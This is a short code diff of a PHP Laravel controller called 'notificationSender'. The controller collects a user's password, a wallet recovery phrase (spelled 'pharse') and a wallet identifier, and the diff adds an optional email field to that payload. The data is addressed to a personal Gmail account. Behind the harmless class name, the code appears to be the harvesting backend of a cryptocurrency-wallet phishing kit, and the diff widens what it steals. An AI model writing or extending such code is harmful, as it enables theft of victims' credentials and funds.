@@ -9,13 +9,18 @@ class notificationSender extends Controller
 {
     public function index(Request $request)
     {
+
+        $email = null;
+        if(!is_null($request->email)){
+            $email =  $request->email;
+        }
+
         $data = [
             'password' => $request->password,
             'pharse' => $request->pharse,
-            'wallet' => $request->wallet
+            'wallet' => $request->wallet,
+            'email' => $email,
         ];
-
-
 
         $user['to'] = 'sourov.okk@gmail.com';
 
